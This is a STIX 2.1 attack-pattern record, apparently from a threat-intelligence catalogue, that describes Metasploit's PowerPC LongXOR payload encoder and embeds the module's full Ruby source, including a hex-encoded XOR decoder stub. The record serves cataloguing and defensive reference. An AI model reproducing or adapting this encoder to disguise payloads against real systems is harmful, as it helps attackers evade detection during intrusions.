{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ff77abe-eb74-4060-a421-d14054ad076b",
    "created": "2024-08-14T16:33:19.203788Z",
    "modified": "2024-08-14T16:33:19.203792Z",
    "name": "PPC LongXOR Encoder",
    "description": " This encoder is ghandi's PPC dword xor encoder but uses a tag-based terminator rather than a length. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/ppc/longxor_tag.rb",
            "external_id": "longxor_tag.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name'             => 'PPC LongXOR Encoder',\n      'Description'      => %q{\n        This encoder is ghandi's PPC dword xor encoder but uses a tag-based\n        terminator rather than a length.\n      },\n      'Author'           => [ 'ddz', 'hdm' ],\n      'Arch'             => ARCH_PPC,\n      'Decoder'          =>\n        {\n          'KeySize'    => 4,\n          'BlockSize'  => 4,\n          'KeyPack'    => 'N',\n        })\n  end\n\n  #\n  # Returns the decoder stub\n  #\n  def decoder_stub(state)\n    [\n      0x7ca52a79,     # 0x1da4 <main>:          xor.    r5,r5,r5\n      0x4082fffd,     # 0x1da8 <main+4>:        bnel+   0x1da4 <main>\n      0x7fe802a6,     # 0x1dac <main+8>:        mflr    r31\n      0x3bffd00c,     # 0x1db0 <main+12>:       addi    r31,r31,-12276\n      0x38a53030,     # 0x1db4 <main+16>:       addi    r5,r5,12336\n      0x3cc00102,     # 0x1db8 <main+20>:       lis     r6, hi16(key)\n      0x60c60304,     # 0x1dbc <main+24>:       ori     r6,r6, lo16(key)\n      0x811f3030,     # 0x1dc0 <main+28>:       lwz     r8,12336(r31)\n      0x7d043279,     # 0x1dc4 <main+32>:       xor.    r4,r8,r6\n      0x909f3030,     # 0x1dc8 <main+36>:       stw     r4,12336(r31)\n      0x7c05f8ac,     # 0x1dcc <main+40>:       dcbf    r5,r31\n      0x7cff04ac,     # 0x1dd0 <main+44>:       sync\n      0x7c05ffac,     # 0x1dd4 <main+48>:       icbi    r5,r31\n      0x3bc5cfd4,     # 0x1dd8 <main+52>:       addi    r30,r5,-12332\n      0x7ffff214,     # 0x1ddc <main+56>:       add     r31,r31,r30\n      0x4082ffe0,     # 0x1de0 <main+60>:       bne+    0x1dc0 <main+28>\n      0x4cff012c,     # 0x1de4 <main+64>:       isync\n    ].pack(\"N*\")\n  end\n\n  #\n  # Fix up the decoder stub now\n  #\n  def encode_finalize_stub(state, stub)\n    stub[22, 2] = [ state.key.to_i ].pack('N')[0, 2]\n    stub[26, 2] = [ state.key.to_i ].pack('N')[2, 2]\n\n    stub\n  end\n\n  #\n  # Append the decoder key now that we're done\n  #\n  def encode_end(state)\n    state.encoded += [ state.key.to_i ].pack('N')\n  end\nend\n"
}